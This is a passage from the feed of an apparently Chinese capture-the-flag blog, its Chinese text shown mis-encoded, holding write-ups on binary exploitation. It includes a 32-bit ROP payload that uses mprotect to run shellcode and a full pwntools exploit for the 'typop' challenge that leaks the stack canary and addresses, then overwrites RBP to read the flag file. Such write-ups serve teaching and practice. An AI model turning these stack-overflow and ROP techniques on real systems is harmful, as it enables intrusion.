id="4-ÊÄªÁªì">4.ÊÄªÁªì</h2><h3 id="1-ÁºìÂÜ≤Âå∫ÈóÆÈ¢ò">(1) ÁºìÂÜ≤Âå∫ÈóÆÈ¢ò</h3><p>Ê≤°ÊúâÊ≥®ÊÑèÂà∞ËøôÈÅìÈ¢òÁõÆÂπ∂Ê≤°Êúâ‰∏Ä‰∏™ÂàùÂßãÂåñÁöÑÂáΩÊï∞Êù•ÂÖ≥Èó≠ÁºìÂÜ≤Âå∫,Á¨îËÄÖÂú®ÂëΩ‰ª§Ë°åÊé•Êî∂ÁöÑÊó∂ÂÄôÂ∞±Âç°‰Ωè‰∫Ü.</p><h3 id="2-main-ÂáΩÊï∞ÁöÑÊ†àÂ∏ßÈóÆÈ¢ò">(2) main()ÂáΩÊï∞ÁöÑÊ†àÂ∏ßÈóÆÈ¢ò</h3><p>ÂØπgdbË∞ÉËØïÁöÑ‰∏çÁÜüÁªÉÂä†‰∏äÂØπIDAÁöÑËøáÂ∫¶‰æùËµñ,Ê≤°ÊúâÊâãÂä®ÂéªÊµãËØïÂá∫ÂÅèÁßªÈáèÁöÑÂ§ßÂ∞è,ÂÆûÈôÖ‰∏ä<code>main()</code>ÊòØË∞ÉÁî®ÁöÑÁ¨¨‰∏Ä‰∏™ÂáΩÊï∞,Ê≠§Êó∂<code>ebp</code>ÂÜÖËøòÊ≤°ÊúâË¢´ÂéãÂÖ•Ê†àÂü∫Âú∞ÂùÄ,ÊâÄ‰ª•ÂÆûÈôÖÂÅèÁßªÂπ∂‰∏çÁî®Âä†‰∏ä0x4</p><h3 id="3-mprotectÂáΩÊï∞Âú®-bssÁöÑÂà©Áî®">(3) mprotectÂáΩÊï∞Âú®.bssÁöÑÂà©Áî®</h3><p>Ëøô‰∏™ÂáΩÊï∞ÁöÑÂèØ‰ª•ÊåáÂÆö‰∏ÄÊÆµÂÜÖÂ≠òÁöÑÊùÉÈôê.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *start, <span class="type">size_t</span> len, <span class="type">int</span> prot)</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Á¨¨‰∏Ä‰∏™ÂèÇÊï∞ÔºöÈúÄÊîπÂÜôÂ±ûÊÄßÁöÑÂÜÖÂ≠ò‰∏≠ÂºÄÂßãÂú∞ÂùÄ</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Á¨¨‰∫å‰∏™ÂèÇÊï∞ÔºöÈúÄÊîπÂÜôÂ±ûÊÄßÁöÑÂÜÖÂ≠òÈïøÂ∫¶</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Á¨¨/‰∏â‰∏™ÂèÇÊï∞ÔºöÈúÄË¶ÅËµã‰∫àÁöÑÊùÉÈôê</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1ÔºâPROT_READÔºöË°®Á§∫ÂÜÖÂ≠òÊÆµÂÜÖÁöÑÂÜÖÂÆπÂèØÂÜôÔºõ</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2ÔºâPROT_WRITEÔºöË°®Á§∫ÂÜÖÂ≠òÊÆµÂÜÖÁöÑÂÜÖÂÆπÂèØËØªÔºõ</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">3ÔºâPROT_EXECÔºöË°®Á§∫ÂÜÖÂ≠òÊÆµ‰∏≠ÁöÑÂÜÖÂÆπÂèØÊâßË°åÔºõ</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">4ÔºâPROT_NONEÔºöË°®Á§∫ÂÜÖÂ≠òÊÆµ‰∏≠ÁöÑÂÜÖÂÆπÊ†πÊú¨Ê≤°Ê≥ïËÆøÈóÆ„ÄÇ</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Ê≥®ÊÑèÔºöÊåáÂÆöÁöÑÂÜÖÂ≠òÂå∫Èó¥ÂøÖÈ°ªÂåÖÂê´Êï¥‰∏™ÂÜÖÂ≠òÈ°µÔºà4KÔºâ„ÄÇÂå∫Èó¥ÂºÄÂßãÁöÑÂú∞ÂùÄstartÂøÖÈ°ªÊòØ‰∏Ä‰∏™ÂÜÖÂ≠òÈ°µÁöÑËµ∑ÂßãÂú∞ÂùÄÔºåÂπ∂‰∏îÂå∫Èó¥ÈïøÂ∫¶lenÂøÖÈ°ªÊòØÈ°µÂ§ßÂ∞èÁöÑÊï¥Êï∞ÂÄç„ÄÇ</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Prot=7 ÊòØÂèØËØªÂèØÂÜôÂèØÊâßË°åÁöÑÊúÄÈ´òÊùÉÈôê</span></span><br><span class="line"><span class="comment">‰∏ÄËà¨Áî®‰∫éÂú®Âà©Áî®shellcodeÊñπÂºèËøõË°åÊ†àÊ∫¢Âá∫Êó∂Ôºå‰ΩÜÊòØbssÊÆµÊ≤°ÊúâË∂≥Â§üÁöÑÊùÉÈôêÊù•ÂÜôÂÖ•shellcodeÊó∂ÔºåÂèØ‰ª•Âà©‰∫émprotectÂáΩÊï∞Êù•ÊîπÂÜôbssÊÆµÁöÑÊùÉÈôê</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="4-32‰ΩçÂáΩÊï∞ËøûÁª≠ÊéßÂà∂ÊâßË°åÊµÅ">(4) 32‰ΩçÂáΩÊï∞ËøûÁª≠ÊéßÂà∂ÊâßË°åÊµÅ</h3><p>Â¶ÇÊûúË¶ÅËøûÁª≠ÊéßÂà∂Á®ãÂ∫èÁöÑÊâßË°åÊµÅ,Â∞±Ë¶Å‰øùÊåÅÊ†àÁöÑÂπ≥Ë°°,‰ΩÜretÁöÑROPÈìæÊòØÊàë‰ª¨ÊâãÂä®ÊûÑÈÄ†ÁöÑ,ÈÇ£‰πàÂ∞±ÈúÄË¶ÅÂú®ÁªìÊùüË∞ÉÁî®ÂáΩÊï∞Êó∂ÊâãÂä®Ê∏ÖÁ©∫.x86ÂáΩÊï∞ÁöÑÂèÇÊï∞ÈÉΩÂú®Ê†à‰∏ä,ÊâÄ‰ª•Êàë‰ª¨ÁöÑËøîÂõûÂú∞ÂùÄ‰∏çÂ∫îÁõ¥Êé•Â°´ÂÜô‰∏ã‰∏Ä‰∏™ÂáΩÊï∞,ËÄåÊòØ‰∏Ä‰∏≤popÊåá‰ª§ÁöÑÂä†retÁöÑÂú∞ÂùÄ,popÁöÑ‰∏™Êï∞ÂèñÂÜ≥‰∫éÁªôÂΩìÂâçÂáΩÊï∞ÂéãÂÖ•Ê†à‰∏≠ÁöÑÂèÇÊï∞ÁöÑ‰∏™Êï∞,ËøôÊ†∑‰ª•ÂêéÊâçÂú®Ëøô‰∏™ÂáΩÊï∞ÁöÑÊúÄÂêé‰∏Ä‰∏™ÂèÇÊï∞ÂêéÈù¢Âä†ÁúüÂÆûÁöÑËøîÂõûÂú∞ÂùÄ,ÂÖ∑‰ΩìÂÆû‰æãÂ¶Ç‰∏ã:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop </span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=p32(mprotect)+p32(pop3_ret)+p32(bss)+p32(<span class="number">0x100</span>)+p32(<span class="number">0x7</span>) <span class="comment">#‰øÆÊîπ.bssÁöÑÊùÉÈôê</span></span><br><span class="line">payload+=p32(read)+p32(pop3_ret)+p32(<span class="number">0</span>)+p32(shellcode_addr)+p32(<span class="number">0x100</span>) <span class="comment">#ËØªÂÖ•shellcode</span></span><br><span class="line">payload+=p32(shellcode_addr) <span class="comment">#ËøîÂõûÂà∞shellcodeÁöÑÂ≠òÂÇ®Âú∞ÂùÄ</span></span><br><span class="line">io.sendline(shellcode) <span class="comment">#ÂèëÈÄÅshellcode</span></span><br></pre></td></tr></table></figure><h2 id="5-ÂºïÁî®ÈìæÊé•">5.ÂºïÁî®ÈìæÊé•</h2><p><a href="https://cloud.tencent.com/developer/article/1740266">https://cloud.tencent.com/developer/article/1740266</a></p><p><a href="https://www.cnblogs.com/lyxf/p/12113401.html">https://www.cnblogs.com/lyxf/p/12113401.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ÊëòË¶Å&quot;&gt;ÊëòË¶Å:&lt;/h2&gt;
&lt;p&gt;ËøôÈ¢òÊ∂âÂèäÂà∞‰∫Üx86ÂáΩÊï∞Ë∞ÉÁî®Á∫¶ÂÆöÁöÑÂÜÖÂÆπ,Áî±‰∫éÈ¢ò‰∏ªÂØπcÂíåÊ±áÁºñ‰∫ÜËß£ÂæóÂπ∂Ê≤°ÊúâÈùûÂ∏∏Ê∑±ÂÖ•,ÂØºËá¥ÈÅáÂà∞‰∫ÜÁÅ∞Â∏∏Â§öÁöÑÂõ∞Èöæüò≠,Êï¥Âêà‰∫ÜÂæàÂ§öÂ∏àÂÇÖÁöÑÈ¢òËß£,Áü•ËØÜÁÇπÊÄªÁªìÂú®ÊúÄÂêé.&lt;/p&gt;
&lt;h2 id=&quot;1-‰º™‰ª£Á†Å&quot;&gt;1.‰º™‰ª£Á†Å&lt;/h2&gt;
&lt;figure clas</summary>
      
    
    
    
    <category term="Â§çÁé∞" scheme="https://www.fomal.cc/categories/%E5%A4%8D%E7%8E%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>typop Write Up</title>
    <link href="https://www.fomal.cc/posts/28066d78.html"/>
    <id>https://www.fomal.cc/posts/28066d78.html</id>
    <published>2023-04-02T03:02:22.722Z</published>
    <updated>2023-04-09T06:24:40.684Z</updated>
    
    <content type="html"><![CDATA[<p>ÂâçË®Ä,Êú¨È¢ò‰ΩøÁî®‰∫Üfake frameÊâãÊ≥ï</p><h2 id="1-Ê∫ê‰ª£Á†Å">1.Ê∫ê‰ª£Á†Å</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">getFeedback</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+Eh] [rbp-12h] BYREF</span></span><br><span class="line">  __int16 v2; <span class="comment">// [rsp+16h] [rbp-Ah]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you like ctf?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">30uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You said: %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)buf == <span class="number">121</span> )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;That&#x27;s great! &quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Aww :( &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Can you provide some extra feedback?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x5A</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">win</span><span class="params">(<span class="type">char</span> a1, <span class="type">char</span> a2, <span class="type">char</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+18h] [rbp-58h]</span></span><br><span class="line">  _BYTE filename[<span class="number">10</span>]; <span class="comment">// [rsp+26h] [rbp-4Ah] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+30h] [rbp-40h] BYREF</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+38h] [rbp-38h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+40h] [rbp-30h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+48h] [rbp-28h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+50h] [rbp-20h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  filename[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">  filename[<span class="number">0</span>] = a1;</span><br><span class="line">  filename[<span class="number">1</span>] = a2;</span><br><span class="line">  filename[<span class="number">2</span>] = a3;</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;filename[<span class="number">3</span>], <span class="string">&quot;g.txt&quot;</span>);</span><br><span class="line">  stream = fopen(filename, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error opening flag file.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)s = <span class="number">0LL</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  v9 = <span class="number">0LL</span>;</span><br><span class="line">  v10 = <span class="number">0LL</span>;</span><br><span class="line">  v11 = <span class="number">0LL</span>;</span><br><span class="line">  fgets(s, <span class="number">32</span>, stream);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v12;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="built_in">puts</span>(<span class="string">&quot;Do you want to complete a survey?&quot;</span>) &amp;&amp; getchar() == <span class="number">121</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    getchar();</span><br><span class="line">    getFeedback();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-ÂàÜÊûêÊºèÊ¥û">2. ÂàÜÊûêÊºèÊ¥û</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>‚ÄãÈò≤Êä§ÂÖ®ÂºÄ,Áî®IDAÂèçÁºñËØëÂèëÁé∞ÊúâÂêéÈó®ÂáΩÊï∞Âπ∂‰∏îÊúâÂèØ‰ª•Âæ™ÁéØË∞ÉÁî®ÁöÑgetfeedbackÂáΩÊï∞,‰ΩÜÊòØÂêéÈó®ÂáΩÊï∞ÈáåÈù¢ÊâìÂºÄflagÁöÑÊñá‰ª∂Âêç‰∏çÂÆåÊï¥,‰ΩÜÊòØÈôÑ‰ª∂Ê≤°ÁªôlibcËÄå‰∏îgadgets‰πü‰∏çÂ§üÂ∏ÉÁΩÆÂÆåÊï¥ÁöÑROPÊù•ÊääÂâç‰∏â‰∏™Â≠óÁ¨¶‰º†Ëøõfilename.‰∏çËøáÁî±‰∫égetfeedback()Âíåwin()ÂàÜÂà´ÊúâbufÂíåfilename‰∏§‰∏™Êú¨Âú∞ÂèòÈáè,ËÄåÂú®ÂáΩÊï∞ÁöÑÊ†àÂ∏ß‰∏≠ÈÄöÂ∏∏Áî®RBPÊù•ËÆøÈóÆÂèòÈáè,ÈÇ£‰πàÂ∞±ÂèØ‰ª•‰øÆÊîπgetfeedback()ÁöÑRBPÊåáÂêëÁöÑÂú∞ÂùÄÂíå]RBP+8],Âç≥ËøîÂõûÂú∞ÂùÄ.</p><p>‚ÄãÈÇ£‰πàÁé∞Âú®ÁöÑÊÄùË∑ØÂ∑≤ÁªèÂü∫Êú¨Êúâ‰∫Ü:</p><p>‚ÄãÁ¨¨‰∏ÄÊ¨°Ë∞ÉÁî®getfeedback(),Âú®Á¨¨‰∏ÄÊ¨°ËæìÂÖ•Êó∂Ë¶ÜÁõñcanary‰Ωé‰Ωç‰∏äÁöÑ\x00,Âõ†‰∏∫canary‰∏ÄËà¨ÂíåÊ†àÂ∫ïË∑ùÁ¶ª‰∏Ä‰∏™Êú∫Âô®Â≠óÈïø,ÊâÄ‰ª•‰ºöÈ°∫Â∏¶ÁùÄÊääprevious RBP‰πüÁªôÊâìÂç∞Âá∫Êù•,ËøôÊòØ‰∏Ä‰∏™Ê†à‰∏äÁöÑÂú∞ÂùÄ,Ê†πÊçÆÊú¨Âú∞Ë∞ÉËØïÂ∞±ÂèØ‰ª•ËÆ°ÁÆóÂá∫Ê†àÂü∫Âú∞ÂùÄÊù•Ë¶ÜÁõñRBP,getfeedback()Á¨¨‰∏ÄÊ¨°ËæìÂÖ•Âè™ËÉΩÊ≥ÑÈú≤Ê†àÂíåcanary,‰∏çËøáÊúâÁ¨¨‰∫åÊ¨°ÁöÑËæìÂÖ•ÂèØ‰ª•Ë°•ÂõûcanaryÁöÑÂÄºÈò≤Ê≠¢Â¥©Ê∫É,ÊâÄ‰ª•Á¨¨‰∫åÊ¨°ËæìÂÖ•ÊääcanaryËøòÂéüÊù•ËøõË°å‰∏ã‰∏ÄÊ¨°Ë∞ÉÁî®getfeedback();</p><p>‚ÄãÁ¨¨‰∫åÊ¨°Ë∞ÉÁî®getfeedback(),ËÆ°ÁÆóÂ•ΩÂÅèÁßªÈáèÊää[RBP+8]ÁªôÊâìÂç∞Âá∫Êù•,ÈÄöËøáIDAÈáåÈù¢ÂÅèÁßªÂú∞ÂùÄËÆ°ÁÆóÂá∫Âü∫Âú∞ÂùÄ,ÂÜçÊ†πÊçÆÈúÄË¶ÅÁÆóÂá∫Ë¶ÅÊéßÂà∂ÁöÑRBPÂú∞ÂùÄ,ËÄÅÊ†∑Â≠êÁ¨¨‰∫åÊ¨°ËæìÂÖ•Ë°•ÂÖ®canary;</p><p>‚ÄãÁ¨¨‰∏âÊ¨°Ë∞ÉÁî®getfeedback(),Áî±‰∫éROPÈìæÁöÑgadget‰∏çÂÖ®,ÊâÄ‰ª•Â∫îËØ•ÊòØÂú®ÂéüÂÖàgetfeedback()ÁöÑbuf‰∏äËæìÂÖ•filename,‰πüÂ∞±ÊòØflag.txt\x00,ÂÜçÈÄöËøáÊ†àÊ∫¢Âá∫ÊìçÊéßRBPÂíåRIPÊääflag.txt\x00ÂΩì‰ΩúÊòØfilename()ÊâìÂºÄ,Âõ†Ê≠§Ë¶ÜÁõñÁî®ÁöÑËøîÂõûÂú∞ÂùÄ‰ΩøÁî®ÁöÑwin()ÈáåÈù¢Ë∞ÉÁî®fopen()ÁöÑËµ∑ÂßãÂú∞ÂùÄ,ËÄåË¶ÅË¶ÜÁõñÁöÑRBPÂú∞ÂùÄÂ∞±ÊØîËæÉÈöè‰æø,ÁªèËøá‰∫ÜÁÆÄÂçïÁöÑË∞ÉËØï,ÂèëÁé∞Â¶ÇÊûúÊääRBPË∑≥ËΩ¨Âà∞ÂèØ‰ª•ÊääbufÂàöÂ•ΩÂΩì‰ΩúfilenameËØªÂÖ•ÁöÑÊó∂ÂÄô,‰πüÂ∞±ÊòØ‰∏ãÈù¢ÁöÑexpÈáåÊúÄÂêé‰∏Ä‰∏™payloadÁöÑÂâçÈù¢10Â≠óËäÇ,ÂΩìRBPË¢´ËÆæÁΩÆÊàêËøô10‰∏™Â≠óËäÇÈôÑËøëÂå∫ÂüüËØªÂèñfilenameÊó∂‰ºöÂá∫Áé∞ËØªÂèñÂ§±Ë¥•,Âç≥‰Ωøflag.txt\x00Â∑≤ÁªèË¢´‰º†ÂÖ•RDI,fopen()‰æùÁÑ∂‰ºöË∞ÉÁî®Â§±Ë¥•,ÊúÄÂêéÁ®çÂæÆË∞ÉËØï‰∏Ä‰∏ãÊääRBPËÆæÁΩÆÊàêËØªÂèñÊõ¥È´ò‰∏Ä‰∫õÂú∞ÂùÄÁöÑÂå∫Âüü‰Ωú‰∏∫filenameÊó∂,flagË¢´ÊàêÂäüËØªÂèñ.</p><h2 id="3-exp">3.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&#x27;./typop&#x27;</span>)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;b main&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Ê≥ÑÈú≤canaryÂíåÊ†àÂú∞ÂùÄ</span></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Do you want to complete a survey?&#x27;</span>, <span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">payload = <span class="number">10</span>*<span class="string">b&#x27;y&#x27;</span></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Do you like ctf?&#x27;</span>, payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;y&#x27;</span>*<span class="number">10</span>)</span><br><span class="line">canary = u64(io.recv(<span class="number">8</span>))-<span class="number">0xa</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line">stack = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x10</span>+<span class="number">0x38</span> <span class="comment">#ÂáèÂéª0x10ËÆ©RBPÊåáÂêëÁöÑÂú∞ÂùÄÂ≠òÊîæËá™Â∑±ÁöÑÂú∞ÂùÄ,Âä†‰∏ä0x38ËÆ©RBPËØªÂèñÁöÑfilenameÂíåbufÂØπÈΩê,‰∏çËøáËøôÊ†∑Êîπ‰ºöÊâì‰∏çÂºÄÊñá‰ª∂,ÊâÄ‰ª•ÂêéÈù¢ÂÜçÂä†‰∫ÜÂÅèÁßª</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line">payload = <span class="number">10</span>*<span class="string">b&#x27;y&#x27;</span>+p64(canary)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Can you provide some extra feedback?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Ê≥ÑÈú≤Á®ãÂ∫èÂä†ËΩΩÂü∫Âú∞ÂùÄ</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Do you want to complete a survey?&#x27;</span>, <span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Do you like ctf?&#x27;</span>, <span class="number">0x1a</span>*<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="number">0x1a</span>*<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x447</span>+<span class="number">0x298</span>+<span class="number">0x51</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#‰øÆÊîπRBPËØªÂÖ•Êñá‰ª∂Âêç,Ëé∑Âèñflag</span></span><br><span class="line">payload = <span class="number">10</span>*<span class="string">b&#x27;y&#x27;</span>+p64(canary)+p64(stack+<span class="number">0x22</span>)+p64(addr)+<span class="string">b&#x27;flag.txt\x00&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Âú®flag.txt\x00ÂâçÈù¢Êúâ0x22Â≠óËäÇÊï∞ÊçÆ,stack+0x22ÂàöÂ•ΩÂèØ‰ª•ËÆ©flag.txt\x00Ë°îÊé•Âú®payloadÂêéÈù¢</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;Can you provide some extra feedback?&#x27;</span>, payload)</span><br><span class="line">io.recvline()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ÂâçË®Ä,Êú¨È¢ò‰ΩøÁî®‰∫Üfake frameÊâãÊ≥ï&lt;/p&gt;
&lt;h2 id=&quot;1-Ê∫ê‰ª£Á†Å&quot;&gt;1.Ê∫ê‰ª£Á†Å&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/s</summary>
      
    
    
    
    <category term="È¢òËß£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>sh_v1.1 WP</title>
    <link href="https://www.fomal.cc/posts/456d7704.html"/>
    <id>https://www.fomal.cc/posts/456d7704.html</id>
    <published>2023-04-02T03:02:22.720Z</published>
    <updated>2023-04-09T06:24:36.817Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-‰º™‰ª£Á†Å">1.‰º™‰ª£Á†Å</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-‰º™‰ª£Á†Å&quot;&gt;1.‰º™‰ª£Á†Å&lt;/h2&gt;
